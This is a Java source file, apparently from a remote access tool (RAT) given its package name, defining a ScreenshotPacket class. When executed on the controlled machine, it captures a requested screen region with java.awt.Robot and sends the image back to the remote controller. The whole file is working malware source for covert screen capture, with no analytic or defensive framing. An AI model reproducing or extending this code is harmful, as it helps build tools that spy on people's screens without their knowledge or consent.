package de.sogomn.rat.packet;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.image.BufferedImage;

import de.sogomn.rat.ActiveClient;

public final class ScreenshotPacket implements IPacket {
	
	private int x, y;
	private int width, height;
	
	public ScreenshotPacket() {
		//...
	}
	
	public ScreenshotPacket(final int x, final int y, final int width, final int height) {
		this.x = x;
		this.y = y;
		this.width = width;
		this.height = height;
	}
	
	@Override
	public void send(final ActiveClient client) {
		client.writeInt(x);
		client.writeInt(y);
		client.writeInt(width);
		client.writeInt(height);
	}
	
	@Override
	public void receive(final ActiveClient client) {
		x = client.readInt();
		y = client.readInt();
		width = client.readInt();
		height = client.readInt();
	}
	
	@Override
	public void execute(final ActiveClient client) {
		final Rectangle screenRect = new Rectangle(x, y, width, height);
		
		try {
			final Robot robot = new Robot();
			final BufferedImage image = robot.createScreenCapture(screenRect);
			final ImagePacket packet = new ImagePacket(image);
			
			client.sendPacket(packet);
		} catch (final AWTException ex) {
			ex.printStackTrace();
		}
	}
	
}
